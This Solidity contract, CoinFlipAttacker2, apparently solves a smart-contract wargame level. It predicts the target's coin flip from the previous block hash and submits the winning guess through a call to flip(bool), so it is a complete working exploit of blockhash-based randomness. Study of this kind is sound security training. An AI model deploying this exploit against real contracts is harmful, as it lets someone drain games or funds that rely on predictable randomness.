// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipAttacker2 {
    address private immutable target;
    uint256 private lastHash;

    constructor(address _target) {
        target = _target;
    }

    function flipGuesser() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("flip(bool)", side)
        );

        require(success == true);

        bool result = abi.decode(data, (bool));

        require(result == true);
    }

    function getLastHash() external view returns (uint256) {
        return lastHash;
    }
}
